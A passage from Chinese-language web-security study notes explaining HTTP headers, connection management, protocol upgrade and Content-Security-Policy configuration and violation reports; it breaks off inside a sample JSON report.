响应的图片"></p><ol><li>HTTP协议版本号</li><li>一个状态码，指明操作是否成功以及原因</li><li>一个状态信息，这个信息是一个不权威、简短的状态码描述</li><li>响应头，与请求头相似</li><li>可选项，一个包含了被获取资源的主体</li></ol><p>附：API：API就像一家餐厅中的点餐窗口，提供了一个标准化的接口，使得应用程序能够与服务进行交互，请求执行特定的功能或获取数据。这种交互通过HTTP协议实现，就像服务员在点餐窗口和厨房之间传递顾客的需求和厨房的服务一样</p><p>附：HTTP&#x2F;2与HTTP&#x2F;1.1有几处基本的不同：</p><blockquote><ul><li>HTTP&#x2F;2 是二进制协议而不是文本协议。不再可读，也不可无障碍的手动创建，改善的优化技术现在可被实施。</li><li>这是一个多路复用协议。并行的请求能在同一个链接中处理，移除了 HTTP&#x2F;1.x 中顺序和阻塞的约束。</li><li>压缩了标头。因为标头在一系列请求中常常是相似的，其移除了重复和传输重复数据的成本。</li><li>其允许服务器在客户端缓存中填充数据，通过一个叫服务器推送的机制来提前请求。</li></ul></blockquote><h3 id="HTTP标头-header"><a href="#HTTP标头-header" class="headerlink" title="HTTP标头(header)"></a>HTTP标头(header)</h3><p>推荐：<a href="https://juejin.cn/post/6844903745004765198">https://juejin.cn/post/6844903745004765198</a></p><h4 id="请求头"><a href="#请求头" class="headerlink" title="请求头"></a>请求头</h4><h5 id="分类："><a href="#分类：" class="headerlink" title="分类："></a>分类：</h5><blockquote><ul><li><a href="https://developer.mozilla.org/zh-CN/docs/Glossary/General_header">通用标头（General header）</a>，例如 <a href="https://developer.mozilla.org/zh-CN/docs/Web/HTTP/Headers/Via"><code>Via</code></a>，适用于整个消息。</li><li><a href="https://developer.mozilla.org/zh-CN/docs/Glossary/Request_header">请求标头（Request header）</a>，例如 <a href="https://developer.mozilla.org/zh-CN/docs/Web/HTTP/Headers/User-Agent"><code>User-Agent</code></a>、<a href="https://developer.mozilla.org/zh-CN/docs/Web/HTTP/Headers/Accept-Type"><code>Accept-Type</code></a>，通过进一步的定义（例如 <a href="https://developer.mozilla.org/zh-CN/docs/Web/HTTP/Headers/Accept-Language"><code>Accept-Language</code></a>）、给定上下文（例如 <a href="https://developer.mozilla.org/zh-CN/docs/Web/HTTP/Headers/Referer"><code>Referer</code></a>）或者进行有条件的限制（例如 <a href="https://developer.mozilla.org/zh-CN/docs/Web/HTTP/Headers/If-None"><code>If-None</code></a>）来修改请求。</li><li><a href="https://developer.mozilla.org/zh-CN/docs/Glossary/Representation_header">表示标头（Representation header）</a>，例如 <a href="https://developer.mozilla.org/zh-CN/docs/Web/HTTP/Headers/Content-Type"><code>Content-Type</code></a> 描述了消息数据的原始格式和应用的任意编码（仅在消息有主体时才存在）。</li></ul></blockquote><h5 id="常用请求头："><a href="#常用请求头：" class="headerlink" title="常用请求头："></a>常用请求头：</h5><h6 id="1-Accept"><a href="#1-Accept" class="headerlink" title="1.Accept"></a>1.Accept</h6><p>Accept: type&#x2F;subtype，浏览器可以接受服务器发来的数据类型</p><h6 id="2-Accept-Encoding"><a href="#2-Accept-Encoding" class="headerlink" title="2.Accept-Encoding"></a>2.Accept-Encoding</h6><blockquote><p>浏览器申明自己接收的编码方法，通常指定压缩方法，是否支持压缩，支持什么压缩方法（注意：这不是只字符编码）。</p></blockquote><h6 id="3-Accept-Language"><a href="#3-Accept-Language" class="headerlink" title="3.Accept-Language"></a>3.Accept-Language</h6><p>浏览器申明自己接受的语言 </p><h6 id="4-Connecction"><a href="#4-Connecction" class="headerlink" title="4.Connecction"></a>4.Connecction</h6><ul><li><strong>Connection: keep-alive</strong> ：建立稳定的TCP链接，客户端下次访问此处时会继续使用该链接</li><li><strong>Connection: close</strong> ：当前Request完成后，客户端和服务器之间用于传输HTTP数据的TCP连接会关闭， 当客户端再次发送Request，需要重新建立TCP连接。</li></ul><h6 id="5-Host-必须的"><a href="#5-Host-必须的" class="headerlink" title="5.Host(必须的)"></a>5.Host(必须的)</h6><p>目标主机和端口号，通常在URL里提取</p><h6 id="6-Referer"><a href="#6-Referer" class="headerlink" title="6.Referer"></a>6.Referer</h6><p>告诉服务器我从哪个页面来</p><h6 id="7-User-Agent"><a href="#7-User-Agent" class="headerlink" title="7.User-Agent"></a>7.User-Agent</h6><p>告诉HTTP服务器， 客户端使用的操作系统和浏览器的名称和版本</p><h6 id="8-Cache-Control"><a href="#8-Cache-Control" class="headerlink" title="8.Cache-Control"></a>8.Cache-Control</h6><p>值：</p><ul><li>private：默认值，应只能够作为私有的缓存，不能在用户间共享</li><li>public：响应会被缓存，并且在多用户间共享。</li><li>must-revalidate：响应在特定条件下会被重用，以满足接下来的请求，但是它必须到服务器端去验证它是不是仍然是最新的</li><li>no-cache：响应不会被缓存,而是实时向服务器端请求资源</li><li>max-age&#x3D;num：设置缓存最大的有效时间，但是这个参数定义的是时间大小（比如：60）而不是确定的时间点。单位是[秒 seconds]。</li><li>no-store：任何条件下，响应都不会被缓存，并且不会被写入到客户端的磁盘里，这也是基于安全考虑的某些敏感的响应才会使用这个。</li></ul><h6 id="9-Cookie"><a href="#9-Cookie" class="headerlink" title="9.Cookie"></a>9.Cookie</h6><p>Cookie是用来存储一些用户信息以便让服务器辨别用户身份</p><h6 id="10-Range（用于断点续传）"><a href="#10-Range（用于断点续传）" class="headerlink" title="10.Range（用于断点续传）"></a>10.Range（用于断点续传）</h6><p>Range:bytes&#x3D;0-5：指定第一个字节的位置和最后一个字节的位置。用于告诉服务器自己想取对象的哪部分。</p><h6 id="11-X-Forwarded-For"><a href="#11-X-Forwarded-For" class="headerlink" title="11.X-Forwarded-For"></a>11.X-Forwarded-For</h6><p>该标头用来表示 HTTP 请求端真实 IP，可伪造</p><h5 id="概览"><a href="#概览" class="headerlink" title="概览"></a>概览</h5><ul><li><p>Accept：指定客户端能够接收的内容类型。</p></li><li><p>Accept-Charset：浏览器可以接受的字符编码集。</p></li><li><p>Accept-Encoding：指定浏览器可以支持的web服务器返回内容压缩编码类型。</p></li><li><p>Accept-Language：浏览器可接受的语言。</p></li><li><p>Accept-Ranges：可以请求网页实体的一个或者多个子范围字段。</p></li><li><p>AuthorizationHTTP：授权的授权证书。</p></li><li><p>Cache-Control：指定请求和响应遵循的缓存机制。</p></li><li><p>Connection：表示是否需要持久连接。（HTTP 1.1默认进行持久连接）</p></li><li><p>CookieHTTP：请求发送时，会把保存在该请求域名下的所有cookie值一起发送给web服务器。</p></li><li><p>Content-Length：请求的内容长度。</p></li><li><p>Content-Type：请求的与实体对应的MIME信息。</p></li><li><p>Date：请求发送的日期和时间。</p></li><li><p>Expect：请求的特定的服务器行为。</p></li><li><p>From：发出请求的用户的Email。</p></li><li><p>Host：指定请求的服务器的域名和端口号。</p></li><li><p>If-Match：只有请求内容与实体相匹配才有效。</p></li><li><p>If-Modified-Since：如果请求的部分在指定时间之后被修改则请求成功，未被修改则返回304代码。</p></li><li><p>If-None-Match：如果内容未改变返回304代码，参数为服务器先前发送的Etag，与服务器回应的Etag比较判断是否改变。</p></li><li><p>If-Range：如果实体未改变，服务器发送客户端丢失的部分，否则发送整个实体。</p></li><li><p>If-Unmodified-Since：只在实体在指定时间之后未被修改才请求成功。</p></li><li><p>Max-Forwards：限制信息通过代理和网关传送的时间。</p></li><li><p>Pragma：用来包含实现特定的指令。</p></li><li><p>Proxy-Authorization：连接到代理的授权证书。</p></li><li><p>Range：只请求实体的一部分，指定范围。</p></li><li><p>Referer：先前网页的地址，当前请求网页紧随其后,即来路。</p></li><li><p>TE：客户端愿意接受的传输编码，并通知服务器接受接受尾加头信息。</p></li><li><p>Upgrade：向服务器指定某种传输协议以便服务器进行转换（如果支持。</p></li><li><p>User-AgentUser-Agent：的内容包含发出请求的用户信息。</p></li><li><p>Via：通知中间网关或代理服务器地址，通信协议。</p></li><li><p>Warning：关于消息实体的警告信息</p></li></ul><h4 id="响应头"><a href="#响应头" class="headerlink" title="响应头"></a>响应头</h4><h5 id="分类：-1"><a href="#分类：-1" class="headerlink" title="分类："></a>分类：</h5><blockquote><ul><li><a href="https://developer.mozilla.org/zh-CN/docs/Glossary/General_header">通用标头（General header）</a>，例如 <a href="https://developer.mozilla.org/zh-CN/docs/Web/HTTP/Headers/Via"><code>Via</code></a>，适用于整个消息。</li><li><a href="https://developer.mozilla.org/zh-CN/docs/Glossary/Response_header">响应标头（Response header）</a>，例如 <a href="https://developer.mozilla.org/zh-CN/docs/Web/HTTP/Headers/Vary"><code>Vary</code></a> 和 <a href="https://developer.mozilla.org/zh-CN/docs/Web/HTTP/Headers/Accept-Ranges"><code>Accept-Ranges</code></a>，提供有关服务器的其他信息，这些信息不适合状态行。</li><li><a href="https://developer.mozilla.org/zh-CN/docs/Glossary/Representation_header">表示标头（Representation header）</a>，例如 <a href="https://developer.mozilla.org/zh-CN/docs/Web/HTTP/Headers/Content-Type"><code>Content-Type</code></a> 描述了消息数据的原始格式和应用的任意编码（仅在消息有主体时才存在）</li></ul></blockquote><h5 id="常见响应头："><a href="#常见响应头：" class="headerlink" title="常见响应头："></a>常见响应头：</h5><h6 id="1-Cache-Control"><a href="#1-Cache-Control" class="headerlink" title="1.Cache-Control"></a>1.Cache-Control</h6><p>（对应请求中的Cache-Control）</p><h6 id="2-Content-Type"><a href="#2-Content-Type" class="headerlink" title="2..Content-Type"></a>2..<strong>Content-Type</strong></h6><p>告诉客户端资源文件的类型以及相应的<strong>字符</strong>编码方式。（注意，这里是字符编码而不是传输编码）</p><h6 id="3-Content-Encoding"><a href="#3-Content-Encoding" class="headerlink" title="3.Content-Encoding"></a>3.Content-Encoding</h6><p>告诉客户端二进制资源通过什么方式(比如gzip)对二进制资源实体进行压缩。</p><p>附：gzip 是一种压缩算法，用于将二进制数据流（包括文本和其他数据类型）进行压缩。gzip 并不是将文本编码成二进制数据流，而是对已有的二进制数据进行压缩，以减小数据的体积。</p><h6 id="4-Date"><a href="#4-Date" class="headerlink" title="4.Date"></a>4.Date</h6><blockquote><p><strong>Date: Tue, 03 Apr 2018 03:52:28 GMT</strong> 这个是服务端发送资源时的服务器时间，GMT是格林尼治所在地的标准时间。http协议中发送的时间都是GMT的，这主要是解决在互联网上，不同时区在相互请求资源的时候，时间混乱问题。</p></blockquote><h6 id="5-Server"><a href="#5-Server" class="headerlink" title="5.Server"></a>5.Server</h6><p>表明服务器类型和对应的版本</p><h6 id="6-Transfer-Encoding"><a href="#6-Transfer-Encoding" class="headerlink" title="6.Transfer-Encoding"></a>6.Transfer-Encoding</h6><blockquote><p><strong>Transfer-Encoding：chunked</strong> 这个响应头告诉客户端，服务器发送的资源的方式是分块发送的。一般分块发送的资源都是服务器动态生成的，在发送时还不知道发送资源的大小，所以采用分块发送，每一块都是独立的，独立的块都能标示自己的长度，最后一块是0长度的，当客户端读到这个0长度的块时，就可以确定资源已经传输完了。</p></blockquote><h6 id="7-Expires"><a href="#7-Expires" class="headerlink" title="7.Expires"></a>7.Expires</h6><blockquote><p><strong>Expires:Sun, 1 Jan 2000 01:00:00 GMT</strong> 这个响应头也是跟缓存有关的，告诉客户端在这个时间前，可以直接访问缓存副本，很显然这个值会存在问题，因为客户端和服务器的时间不一定会都是相同的，如果时间不同就会导致问题。所以这个响应头是没有Cache-Control：max-age&#x3D;*这个响应头准确的，因为max-age&#x3D;date中的date是个相对时间，不仅更好理解，也更准确。</p></blockquote><h6 id="8-Last-Modified"><a href="#8-Last-Modified" class="headerlink" title="8.Last-Modified"></a>8.Last-Modified</h6><blockquote><p><strong>Last-Modified: Dec, 26 Dec 2015 17:30:00 GMT</strong> 所请求的对象的最后修改日期(按照 RFC 7231 中定义的“超文本传输协议日期”格式来表示)</p></blockquote><h6 id="9-Connection"><a href="#9-Connection" class="headerlink" title="9.Connection"></a>9.Connection</h6><p><strong>Connection：keep-alive</strong> 回应客户端的Connection：keep-alive，告诉客户端服务器的tcp连接也是一个长连接，客户端可以继续使用这个tcp连接发送http请求。</p><h6 id="10-Etag"><a href="#10-Etag" class="headerlink" title="10.Etag"></a>10.Etag</h6><blockquote><p><strong>ETag: “737060cd8c284d8af7ad3082f209582d”</strong> 就是一个对象（比如URL）的标志值，就一个对象而言，比如一个html文件，如果被修改了，其Etag也会别修改，所以，ETag的作用跟Last-Modified的作用差不多，主要供WEB服务器判断一个对象是否改变了。比如前一次请求某个html文件时，获得了其 ETag，当这次又请求这个文件时，浏览器就会把先前获得ETag值发送给WEB服务器，然后WEB服务器会把这个ETag跟该文件的当前ETag进行对比，然后就知道这个文件有没有改变了。</p></blockquote><h6 id="11-Refresh"><a href="#11-Refresh" class="headerlink" title="11.Refresh"></a>11.Refresh</h6><blockquote><p><strong>Refresh: 5; url&#x3D;<a href="http://baidu.com/">http://baidu.com</a></strong> 用于重定向，或者当一个新的资源被创建时。默认会在5秒后刷新重定向。</p></blockquote><h6 id="12-Access-Control-Allow-Origin"><a href="#12-Access-Control-Allow-Origin" class="headerlink" title="12.Access-Control-Allow-Origin"></a>12.Access-Control-Allow-Origin</h6><blockquote><p><strong>Access-Control-Allow-Origin: *</strong>  <em>号代表所有网站可以跨域资源共享，如果当前字段为</em>那么Access-Control-Allow-Credentials就不能为true</p><p>Access-Control-Allow-Origin: <a href="http://www.baidu.com/">www.baidu.com</a> 指定哪些网站可以跨域资源共享</p></blockquote><h6 id="13-Access-Control-Allow-Methods"><a href="#13-Access-Control-Allow-Methods" class="headerlink" title="13.Access-Control-Allow-Methods"></a>13.Access-Control-Allow-Methods</h6><blockquote><p><strong>Access-Control-Allow-Methods：GET,POST,PUT,DELETE</strong> 允许哪些方法来访问</p></blockquote><h6 id="14-Access-Control-Allow-Credentials"><a href="#14-Access-Control-Allow-Credentials" class="headerlink" title="14.Access-Control-Allow-Credentials"></a>14.Access-Control-Allow-Credentials</h6><blockquote><p><strong>Access-Control-Allow-Credentials: true</strong> 是否允许发送cookie。默认情况下，Cookie不包括在CORS请求之中。设为true，即表示服务器明确许可，Cookie可以包含在请求中，一起发给服务器。这个值也只能设为true，如果服务器不要浏览器发送Cookie，删除该字段即可。如果access-control-allow-origin为*，当前字段就不能为true</p></blockquote><h6 id="15-Content-Range"><a href="#15-Content-Range" class="headerlink" title="15.Content-Range"></a>15.Content-Range</h6><blockquote><p><strong>Content-Range: bytes 0-5&#x2F;7877</strong> 指定整个实体中的一部分的插入位置，他也指示了整个实体的长度。在服务器向客户返回一个部分响应，它必须描述响应覆盖的范围和整个实体长度。</p></blockquote><h5 id="概览-1"><a href="#概览-1" class="headerlink" title="概览"></a>概览</h5><ul><li><p>Accept-Ranges：表明服务器是否支持指定范围请求及哪种类型的分段请求。</p></li><li><p>Age：从原始服务器到代理缓存形成的估算时间（以秒计，非负）。</p></li><li><p>Allow：对某网络资源的有效的请求行为，不允许则返回405。</p></li><li><p>Cache-Control：告诉所有的缓存机制是否可以缓存及哪种类型。</p></li><li><p>Content-Encodingweb：服务器支持的返回内容压缩编码类型。。</p></li><li><p>Content-Language：响应体的语言。</p></li><li><p>Content-Length：响应体的长度。</p></li><li><p>Content-Location：请求资源可替代的备用的另一地址。</p></li><li><p>Content-MD5：返回资源的MD5校验值。</p></li><li><p>Content-Range：在整个返回体中本部分的字节位置。</p></li><li><p>Content-Type：返回内容的MIME类型。</p></li><li><p>Date：原始服务器消息发出的时间。</p></li><li><p>ETag：请求变量的实体标签的当前值。</p></li><li><p>Expires：响应过期的日期和时间。</p></li><li><p>Last-Modified：请求资源的最后修改时间。</p></li><li><p>Location：用来重定向接收方到非请求URL的位置来完成请求或标识新的资源。</p></li><li><p>Pragma：包括实现特定的指令，它可应用到响应链上的任何接收方。</p></li><li><p>Proxy-Authenticate：它指出认证方案和可应用到代理的该URL上的参数。</p></li><li><p>refresh：应用于重定向或一个新的资源被创造，在5秒之后重定向（由网景提出，被大部分浏览器支持）</p></li><li><p>Retry-After：如果实体暂时不可取，通知客户端在指定时间之后再次尝试。</p></li><li><p>Serverweb：服务器软件名称。</p></li><li><p>Set-Cookie：设置Http Cookie。</p></li><li><p>Trailer：指出头域在分块传输编码的尾部存在。</p></li><li><p>Transfer-Encoding：文件传输编码。</p></li><li><p>Vary：告诉下游代理是使用缓存响应还是从原始服务器请求。</p></li><li><p>Via：告知代理客户端响应是通过哪里发送的。</p></li><li><p>Warning：警告实体可能存在的问题。</p></li><li><p>WWW-Authenticate：表明客户端请求实体应该使用的授权方案。</p></li></ul><h3 id="HTTP会话过程"><a href="#HTTP会话过程" class="headerlink" title="HTTP会话过程"></a>HTTP会话过程</h3><p>第一步：客户端建立一条 TCP 连接（如果传输层不是 TCP，也可以是其他适合的连接）。</p><p>第二步：客户端发送请求并等待应答。(Resquest)</p><p>第三步：服务器处理请求并送回应答，回应包括一个状态码和对应的数据。(Response)</p><p>从 HTTP&#x2F;1.1 开始，连接在完成第三阶段后不再关闭，客户端可以再次发起新的请求。这意味着第二步和第三步可以连续进行数次。</p><h3 id="HTTP-1-x-的连接管理"><a href="#HTTP-1-x-的连接管理" class="headerlink" title="HTTP&#x2F;1.x 的连接管理"></a>HTTP&#x2F;1.x 的连接管理</h3><p>讨论四种方式：</p><h4 id="Ⅰ-短连接"><a href="#Ⅰ-短连接" class="headerlink" title="Ⅰ.短连接"></a>Ⅰ.短连接</h4><p>HTTP&#x2F;1.0的默认方式，每次会话都要重新建立TCP连接</p><p>建立TCP 连接本身就是耗费时间的，可以保持更多的TCP热连接来适应负载。短连接破坏了 TCP 具备的能力，并且新的冷连接降低了其性能。</p><blockquote><p>这是 HTTP&#x2F;1.0 的默认模型（如果没有指定 <a href="https://developer.mozilla.org/zh-CN/docs/Web/HTTP/Headers/Connection"><code>Connection</code></a> 协议头，或者是值被设置为 <code>close</code>）。而在 HTTP&#x2F;1.1 中，只有当 <a href="https://developer.mozilla.org/zh-CN/docs/Web/HTTP/Headers/Connection"><code>Connection</code></a> 被设置为 <code>close</code> 时才会用到这个模型。</p></blockquote><h4 id="Ⅱ-长连接"><a href="#Ⅱ-长连接" class="headerlink" title="Ⅱ.长连接"></a>Ⅱ.长连接</h4><p>长连接又被称为<strong>keep-alive连接</strong></p><p>长连接会在空闲一段时间后自动关闭（服务器可以使用 <a href="https://developer.mozilla.org/zh-CN/docs/Web/HTTP/Headers/Keep-Alive"><code>Keep-Alive</code></a> 协议头来指定一个最小的连接保持时间）。</p><p>长连接缺点：长连接在空闲状态仍然会消耗服务器资源，而且在重负载时还有可能遭受 <a href="https://developer.mozilla.org/zh-CN/docs/Glossary/DOS_attack">DoS 攻击</a>。这种场景下可以使用非长连接，即尽快关闭那些空闲的连接，也能对性能有所提升。</p><p>注意：</p><blockquote><p>HTTP&#x2F;1.0 里默认并不使用长连接。把 <a href="https://developer.mozilla.org/zh-CN/docs/Web/HTTP/Headers/Connection"><code>Connection</code></a> 设置成 <code>close</code> 以外的其他参数都可以让其保持长连接，通常会设置为 <code>retry-after</code>。</p><p>在 HTTP&#x2F;1.1 里，默认就是长连接的，不再需要标头（但我们还是会把它加上，万一某个时候因为某种原因要退回到 HTTP&#x2F;1.0 呢）。</p></blockquote><h4 id="Ⅲ-流水线"><a href="#Ⅲ-流水线" class="headerlink" title="Ⅲ.流水线"></a>Ⅲ.流水线</h4><p>流水线并发多个请求，在提高性能的同时对服务端的要求提高，并且也存在新的风险。</p><p>附：</p><blockquote><p> HTTP 流水线在现代浏览器中并不是默认被启用的：</p><ul><li>有缺陷的<a href="https://zh.wikipedia.org/wiki/%E4%BB%A3%E7%90%86%E6%9C%8D%E5%8A%A1%E5%99%A8">代理服务器</a>仍然很常见，这些会导致 Web 开发人员无法预见和轻松诊断的奇怪和不稳定行为。</li><li>正确的实现流水线是复杂的：传输中的资源大小、多少有效的 <a href="https://zh.wikipedia.org/wiki/%E4%BE%86%E5%9B%9E%E9%80%9A%E8%A8%8A%E5%BB%B6%E9%81%B2">RTT</a> 会被用到以及有效带宽都会直接影响到流水线提供的改善。不知道这些的话，重要的消息可能被延迟到不重要的消息后面。这个重要性的概念甚至会演变为影响到页面布局！因此 HTTP 流水线在大多数情况下带来的改善并不明显。</li><li>流水线受制于<a href="https://zh.wikipedia.org/wiki/%E9%98%9F%E5%A4%B4%E9%98%BB%E5%A1%9E">队头阻塞（HOL）</a>问题。</li></ul><p> 由于这些原因，流水线已被 HTTP&#x2F;2 中更好的算法——<em>多路复用</em>（multiplexing）所取代。</p></blockquote><h4 id="Ⅳ-域名分块"><a href="#Ⅳ-域名分块" class="headerlink" title="Ⅳ.域名分块"></a>Ⅳ.域名分块</h4><p>须知：</p><blockquote><p> 除非你有紧急而迫切的需求，不要使用这一过时的技术；而是升级到 HTTP&#x2F;2。在 HTTP&#x2F;2 里，做域名分片就没必要了：HTTP&#x2F;2 的连接可以很好的处理并发的无优先级的请求。域名分片甚至会影响性能。大多数 HTTP&#x2F;2 的实现还会使用一种称作<a href="https://daniel.haxx.se/blog/2016/08/18/http2-connection-coalescing/">连接聚合</a>的技术去尝试合并被分片的域名。</p></blockquote><p>简单来说，创建多个通向主域名的附域名，每个域名又有多个连接。如下图：</p><p><img src="/./../../../web%E5%AE%89%E5%85%A8/WEB%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0-%E7%9F%A5%E8%AF%86%E7%AF%87/%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/httpsharding.png" alt="Without domain sharding, a client requests six images from a domain with a maximum of two requests taking place in parallel. With domain sharding, the images are available from two domains and the client can run four requests in parallel, downloading the images in less time."></p><h3 id="HTTP协议升级"><a href="#HTTP协议升级" class="headerlink" title="HTTP协议升级"></a>HTTP协议升级</h3><p>简单解释：</p><ol><li>初始状态，较为低级</li><li>由客户端提出升级请求</li><li>协商升级（客户端发送一个请求头部包含 <code>Upgrade: websocket</code>，表示想要升级到 WebSocket 协议，服务端同意升级）</li><li>升级成功，切换到一个新的协议（如 WebSocket）</li></ol><h2 id="HTTP安全"><a href="#HTTP安全" class="headerlink" title="HTTP安全"></a>HTTP安全</h2><h3 id="内容安全策略-CSP"><a href="#内容安全策略-CSP" class="headerlink" title="内容安全策略(CSP)"></a><strong>内容安全策略(CSP)</strong></h3><h4 id="概述"><a href="#概述" class="headerlink" title="概述"></a>概述</h4><p>Content-Security-Policy，是一个额外的安全层，用于检测并削弱一些特定的攻击，如XSS(跨站脚本攻击)，数据注入攻击等等。</p><p>为使 CSP 可用，需要配置网络服务器返回 <a href="https://developer.mozilla.org/zh-CN/docs/Web/HTTP/Headers/Content-Security-Policy"><code>Content-Security-Policy</code></a> HTTP 标头（X-Content-Security-Policy&#96; 标头是旧版本的，无须再如此指定）。</p><p>除此之外，<meta>元素也可以被用来配置该策略，例如</p><pre><code class="highlight plaintext">&lt;meta  http-equiv=&quot;Content-Security-Policy&quot;  content=&quot;default-src &#x27;self&#x27;; img-src https://*; child-src &#x27;none&#x27;;&quot; /&gt;</code></pre><h4 id="可缓解的威胁"><a href="#可缓解的威胁" class="headerlink" title="可缓解的威胁"></a>可缓解的威胁</h4><p>缓解跨站脚本攻击(XSS)</p><blockquote><p>CSP 的主要目标是减少和报告 XSS 攻击。XSS 攻击利用了浏览器对于从服务器所获取的内容的信任。恶意脚本在受害者的浏览器中得以运行，因为浏览器信任其内容来源，即使有的时候这些脚本并非来自于它本该来的地方。</p></blockquote><p>CSP制定了一个白名单域(制定白名单是一个好习惯)，一个CSP兼容的浏览器仅会执行从白名单域获取到的脚本文件，其余的忽略。</p><p>缓解数据包嗅探攻击</p><blockquote><p>除限制可以加载内容的域，服务器还可指明哪种协议允许使用；比如（从理想化的安全角度来说），服务器可指定所有内容必须通过 HTTPS 加载。一个完整的数据安全传输策略不仅强制使用 HTTPS 进行数据传输，也为所有的 <a href="https://developer.mozilla.org/zh-CN/docs/Web/HTTP/Cookies">cookie 标记 <code>secure</code> 标识</a>，并且提供自动的重定向使得 HTTP 页面导向 HTTPS 版本。网站也可以使用 <a href="https://developer.mozilla.org/zh-CN/docs/Web/HTTP/Headers/Strict-Transport-Security"><code>Strict-Transport-Security</code></a> HTTP 标头确保连接它的浏览器只使用加密通道。</p></blockquote><p>通过导向HTTPS进而避免数据包嗅探攻击。</p><h4 id="使用CSP"><a href="#使用CSP" class="headerlink" title="使用CSP"></a>使用CSP</h4><h5 id="制定策略："><a href="#制定策略：" class="headerlink" title="制定策略："></a>制定策略：</h5><p>使用 <strong>Content-Security-Policy</strong> HTTP 标头来指定策略，如下：</p><pre><code class="highlight plaintext">Content-Security-Policy: policy</code></pre><p>策略（policy）参数是一个包含了各种描述你的 CSP 策略指令的字符串。</p><h5 id="编写策略："><a href="#编写策略：" class="headerlink" title="编写策略："></a>编写策略：</h5><p>策略由一系列策略指令所组成，每个策略指令都描述了针对某个特定资源的类型以及策略生效的范围。策略应当包含一个<strong>default-src</strong>策略指令，在其他资源类型没有符合自己的策略时应用该策略。</p><h5 id="对策略进行测试："><a href="#对策略进行测试：" class="headerlink" title="对策略进行测试："></a>对策略进行测试：</h5><p>使用 <strong>Content-Security-Policy-Report-Only</strong> HTTP 标头来指定策略，如下：</p><pre><code class="highlight plaintext">Content-Security-Policy-Report-Only: policy</code></pre><p>附：</p><blockquote><p>如果 <a href="https://developer.mozilla.org/zh-CN/docs/Web/HTTP/Headers/Content-Security-Policy-Report-Only"><code>Content-Security-Policy-Report-Only</code></a> 标头和 <a href="https://developer.mozilla.org/zh-CN/docs/Web/HTTP/Headers/Content-Security-Policy"><code>Content-Security-Policy</code></a> 同时出现在一个响应中，两个策略均有效。在 <code>Content-Security-Policy</code> 标头中指定的策略有强制性，而 <code>Content-Security-Policy-Report-Only</code> 中的策略仅产生报告而不具有强制性。</p></blockquote><h5 id="启用报告："><a href="#启用报告：" class="headerlink" title="启用报告："></a>启用报告：</h5><p>默认情况下不发送报告，需要指定<strong>report-to</strong>策略指令，并提供至少一个URI地址以递交报告，如下：</p><pre><code class="highlight plaintext">Content-Security-Policy: default-src &#x27;self&#x27;; report-uri http://reportcollector.example.com/collector.cgi</code></pre><p>然后需要设置服务器能够接收报告；使其能够以恰当的方式存储并处理这些报告。</p><h5 id="违规报告的语法："><a href="#违规报告的语法：" class="headerlink" title="违规报告的语法："></a>违规报告的语法：</h5><h6 id="1-blocked-uri"><a href="#1-blocked-uri" class="headerlink" title="1.blocked-uri"></a>1.blocked-uri</h6><blockquote><p>被 CSP 阻止的资源 URI。如果被阻止的 URI 来自不同的源而非 <code>document-uri</code>，那么被阻止的资源 URI 会被删减，仅保留协议、主机和端口号。</p></blockquote><h6 id="2-disposition"><a href="#2-disposition" class="headerlink" title="2.disposition"></a>2.disposition</h6><blockquote><p>根据 <a href="https://developer.mozilla.org/zh-CN/docs/Web/HTTP/Headers/Content-Security-Policy-Report-Only"><code>Content-Security-Policy-Report-Only</code></a> 和 <code>Content-Security-Policy</code> 标头使用情况的不同，值为 <code>&quot;enforce&quot;</code> 或 <code>&quot;report&quot;</code>。</p></blockquote><h6 id="3-document-uri"><a href="#3-document-uri" class="headerlink" title="3.document-uri"></a>3.document-uri</h6><p>发生违规文档的URI</p><h6 id="4-effective-directive"><a href="#4-effective-directive" class="headerlink" title="4.effective-directive"></a>4.effective-directive</h6><blockquote><p>导致违规行为发生的指令。一些浏览器可能提供不同的值，例如 Chrome 提供 <code>style-src-elem</code> 或 <code>style-src-attr</code>，即使实际执行的指令是 <code>style-src</code>。</p></blockquote><h6 id="5-original-policy"><a href="#5-original-policy" class="headerlink" title="5.original-policy"></a>5.original-policy</h6><p>由 <strong>Content-Security-Policy</strong> HTTP 标头指定的原始策略值。</p><h6 id="6-referer"><a href="#6-referer" class="headerlink" title="6.referer"></a>6.referer</h6><p>违规发生的地址</p><h6 id="7-script-sample"><a href="#7-script-sample" class="headerlink" title="7.script-sample"></a>7.script-sample</h6><blockquote><p>导致该违规的内联代码、事件处理器或样式的前 40 个字符。只适用于 <code>script-src*</code> 或 <code>style-src*</code> 包含 <code>&#39;report-sample&#39;</code> 的情况。</p></blockquote><h6 id="8-status-code"><a href="#8-status-code" class="headerlink" title="8.status-code"></a>8.status-code</h6><p>全局对象被实例化的资源的 HTTP 状态代码。</p><h6 id="9-violated-directive"><a href="#9-violated-directive" class="headerlink" title="9.violated-directive"></a>9.violated-directive</h6><blockquote><p>导致违反策略的指令。<code>violated-directive</code> 是 <code>effective-directive</code> 字段的历史名称，并包含相同的值。</p></blockquote><h5 id="违规报告的样本："><a href="#违规报告的样本：" class="headerlink" title="违规报告的样本："></a>违规报告的样本：</h5><p>页面位于<a href="http://example.com/signup.html%EF%BC%8C%E5%81%87%E8%AE%BE%E6%9C%89%E5%A6%82%E4%B8%8B%E7%AD%96%E7%95%A5%EF%BC%9A">http://example.com/signup.html，假设有如下策略：</a></p><pre><code class="highlight plaintext">Content-Security-Policy: default-src &#x27;none&#x27;; style-src cdn.example.com; report-uri /_/csp-reports</code></pre><p>在样本HTML文档中：</p><pre><code class="highlight plaintext">&lt;link rel=&quot;stylesheet&quot; href=&quot;css/style.css&quot; /&gt;</code></pre><blockquote><p>这里仅允许加载自 <code>cdn.example.com</code> 的样式表，然而该页面企图从自己的源（<code>http://example.com</code>）加载。当该文档被访问时，一个兼容 CSP 的浏览器将以 POST 请求的形式发送违规报告到 <code>http://example.com/_/csp-reports</code>，内容如下：</p></blockquote><pre><code class="highlight json"><span class="punctuation">&#123;</span>  <span class="attr">&quot;csp-report&quot;</span><span class="punctuation">:</span> <span class="punctuation">&#123;</span>    <span class="attr">&quot;blocked-uri&quot;</span><span class="punctuation">:</span> <span class="string">&quot;http://example.com/css/style.css&quot;</span><span class="punctuation">,</span>    <span class="attr">&quot;disposition&quot;</span><span class="punctuation">:</span> <span class="string">&quot;report&quot;</span><span class="punctuation">,</span>    <span class="attr">&quot;document-uri&quot;</span><span class="punctuation">:</span> <span 